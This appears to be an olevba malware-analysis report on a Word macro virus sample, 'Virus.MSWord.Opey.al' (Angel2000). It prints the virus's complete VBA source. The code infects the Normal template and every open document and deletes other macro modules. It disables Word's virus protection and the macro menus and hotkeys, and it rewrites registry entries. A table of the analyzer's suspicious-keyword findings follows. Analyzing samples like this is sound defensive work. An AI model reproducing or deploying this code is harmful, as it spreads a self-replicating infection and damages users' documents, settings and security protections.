olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.al
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.al - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angel2000.bas 
in file: Virus.MSWord.Opey.al - OLE stream: 'Macros/VBA/Angel2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angel20001.bas 
in file: Virus.MSWord.Opey.al - OLE stream: 'Macros/VBA/Angel20001'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Call clascopy
    If Month(Date) = 12 Then
        Application.Quit
    End If
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call clascopy
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub clascopy()
    On Error Resume Next
    Call stealth
    NInfected = False
    For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        modname = NormalTemplate.VBProject.VBComponents(A_A).Name
        If modname = "Angel2000" Then NInfected = True
        If (modname <> "Angel2000") And (modname <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
    Next A_A
    For Each DocOpen In Documents
        DInfected = False
        With DocOpen
            For B_B = DocOpen.VBProject.VBComponents.Count To 1 Step -1
                modname = DocOpen.VBProject.VBComponents(B_B).Name
                If modname = "Angel2000" Then DInfected = True
                If (modname <> "Angel2000") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then Application.OrganizerDelete Source:=DocOpen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
            Next B_B
            If DInfected = False Then
                e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                DocOpen.VBProject.VBComponents.Add(1).Name = "Angel2000"
                DocOpen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                'DocOpen.SaveAs FileName:=DocOpen.FullName
            End If
        End With
    Next DocOpen
    If NInfected = False Then
        e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
        vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
        NormalTemplate.VBProject.VBComponents.Add(1).Name = "Angel2000"
        NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
        NormalTemplate.Save
    End If
End Sub
Sub stealth()
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "SOFT Group. Copyright(c) 2000"
        .Execute
    End With
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main", _
    "Start Page") = "www.sti.edu.ph"
     System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION", _
    "RegisteredOwner") = "Avenging Angel :)"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = _
    "Infected with Angel Virus"
End Sub
Sub ToolsMacro()
End Sub
Sub ViewCode()
    Call ToolsMacro
End Sub
Sub ViewVBCode()
    Call ToolsMacro
End Sub














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

